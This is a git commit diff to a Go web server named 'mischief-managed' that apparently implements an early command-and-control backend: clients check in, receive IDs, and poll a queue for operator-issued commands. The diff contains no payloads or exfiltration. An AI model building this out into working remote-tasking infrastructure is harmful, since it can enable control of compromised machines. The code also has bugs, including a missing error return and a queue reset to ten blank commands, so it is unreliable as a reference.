23d555f04f633155cbf4bebfd8831f6db173d2ff
v33ps <v33ps@protonmail.com>
2020-02-29 20:08:27 -0500

    basics up and running. in desperate need of a refactor

--- README.md
+++ README.md
@@ -1,1 +1,6 @@
 # mischief-managed
+
+client rest api
+/api/client/new -- new client checking in
+/api/client/get_task -- check the queue for new tasks
+/api/client/task_complete -- send the task completion
--- main.go
+++ main.go
@@ -5,9 +5,12 @@ import (
 	"encoding/json"
 	"fmt"
 	"html/template"
+	"io"
 	"io/ioutil"
 	"net/http"
+	"strconv"
 	"sync"
+	"time"
 
 	"github.com/gorilla/mux"
 )
@@ -26,20 +29,22 @@ type Page struct {
 }
 
 type Command struct {
-	taskID      int
-	CommandType int
-	Function    string
-	Iterations  int
-	Params      map[string]string
+	CommandType int               `json:"commandType"`
+	Function    string            `json:"function"`
+	Iterations  int               `json:"iterations"`
+	Params      map[string]string `json:"params"`
+	TaskID      int               `json:"taskID"`
 }
 
 type Client struct {
-	clientID        int
-	outgoingQueue   []Command
-	lastCheckinTime int64
+	ClientID        int       `json:"clientID"`
+	ClientName      string    `json:"clientName"`
+	LastCheckinTime int64     `json:"lastcheckintime"`
+	OutgoingQueue   []Command `json:"outgoingQueue"`
 }
 
 var clientList = []Client{}
+var clientIDCounter = 0
 
 func main() {
 
@@ -51,7 +56,8 @@ func main() {
 	router.HandleFunc("/send", handleSend).Methods("POST")
 
 	// client facing endpionts
-	router.HandleFunc("/client/new", clientHandleNew).Methods("GET")
+	router.HandleFunc("/client/new", clientHandleNew).Methods("POST")
+	router.HandleFunc("/client/get_tasks", clientHanldGetTasks).Methods("GET")
 
 	http.Handle("/", router)
 	http.ListenAndServe(":7777", nil)
@@ -72,30 +78,118 @@ func display(w http.ResponseWriter, tmpl string, data interface{}) {
 func handleSend(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
 	msg := r.Form.Get("data")
-	fmt.Println(msg)
-	data := &Command{}
-	err := json.Unmarshal([]byte(msg), data)
+	clientID, err := strconv.Atoi(r.Form.Get("clientID"))
 	if err != nil {
-		fmt.Println("we have an error oh nooo", err)
+		w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+		w.WriteHeader(422) // unprocessable entity
+		if err := json.NewEncoder(w).Encode(err); err != nil {
+			panic(err)
+		}
 	}
-	fmt.Println(data)
+
+	cmd := Command{}
+	if err := json.Unmarshal([]byte(msg), &cmd); err != nil {
+		w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+		w.WriteHeader(422) // unprocessable entity
+		if err := json.NewEncoder(w).Encode(err); err != nil {
+			panic(err)
+		}
+	}
+	err = addToOutgoingQueue(cmd, clientID)
+	if err != nil {
+		fmt.Println("oh noooo")
+	}
+	w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+	w.WriteHeader(http.StatusCreated)
+	if err := json.NewEncoder(w).Encode("{\"status\":\"ok\"}"); err != nil {
+		panic(err)
+	}
 }
 
-// handle a new incoming client
+// take the @msg from the webapp and add it to the clients queue
+func addToOutgoingQueue(cmd Command, clientID int) error {
+	for i, v := range clientList {
+		if v.ClientID == clientID {
+			// we found our client, now add the msg to their outgoingQueue
+			clientList[i].OutgoingQueue = append(v.OutgoingQueue, cmd)
+			break
+		}
+	}
+	fmt.Println(clientList)
+	return nil
+}
+
+// accept a new client and give them their client ID
 func clientHandleNew(w http.ResponseWriter, r *http.Request) {
-	fmt.Println("oh my god hi")
-	var newClient Client
-	reqBody, err := ioutil.ReadAll(r.Body)
+	client := Client{}
+	body, err := ioutil.ReadAll(io.LimitReader(r.Body, 1048576))
 	if err != nil {
-		fmt.Fprintf(w, "ERROR parsing JSON data dummy")
+		panic(err)
+	}
+	if err := r.Body.Close(); err != nil {
+		panic(err)
+	}
+	if err := json.Unmarshal(body, &client); err != nil {
+		w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+		w.WriteHeader(422) // unprocessable entity
+		if err := json.NewEncoder(w).Encode(err); err != nil {
+			panic(err)
+		}
 	}
 
-	json.Unmarshal(reqBody, &newClient)
-	clientList = append(clientList, newClient)
-	w.WriteHeader(http.StatusCreated)
+	clientIDCounter = clientIDCounter + 1
 
-	json.NewEncoder(w).Encode(newClient)
-	fmt.Println(clientList)
-	resp := []byte("omg hi")
-	w.Write(resp)
+	client.LastCheckinTime = time.Now().Unix()
+	client.ClientID = clientIDCounter
+	client.OutgoingQueue = make([]Command, 0)
+	fmt.Println("client:", client)
+	clientList = append(clientList, client)
+
+	w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+	w.WriteHeader(http.StatusCreated)
+	if err := json.NewEncoder(w).Encode(client); err != nil {
+		panic(err)
+	}
+}
+
+// search through @clientList to find if our client has anything in the outgoingQueue
+func clientHanldGetTasks(w http.ResponseWriter, r *http.Request) {
+	// get our client from the incoming JSON
+	client := Client{}
+	body, err := ioutil.ReadAll(io.LimitReader(r.Body, 1048576))
+	if err != nil {
+		panic(err)
+	}
+	if err := r.Body.Close(); err != nil {
+		panic(err)
+	}
+	if err := json.Unmarshal(body, &client); err != nil {
+		w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+		w.WriteHeader(422) // unprocessable entity
+		if err := json.NewEncoder(w).Encode(err); err != nil {
+			panic(err)
+		}
+	}
+
+	clientIndex := 0
+	// search for our client
+	for i, v := range clientList {
+		if v.ClientID == client.ClientID {
+			// we found our client, now add the msg to their outgoingQueue
+			client.OutgoingQueue = v.OutgoingQueue
+			clientIndex = i
+			break
+		}
+	}
+	fmt.Println("client: ", client)
+
+	// send the queue back to the client
+	w.Header().Set("Content-Type", "application/json; charset=UTF-8")
+	// w.WriteHeader(http.StatusOK)
+	if err := json.NewEncoder(w).Encode(client); err != nil {
+		panic(err)
+	}
+
+	// since we've given away the outgoingQueue list, truncate the list
+	clientList[clientIndex].OutgoingQueue = make([]Command, 10)
 }
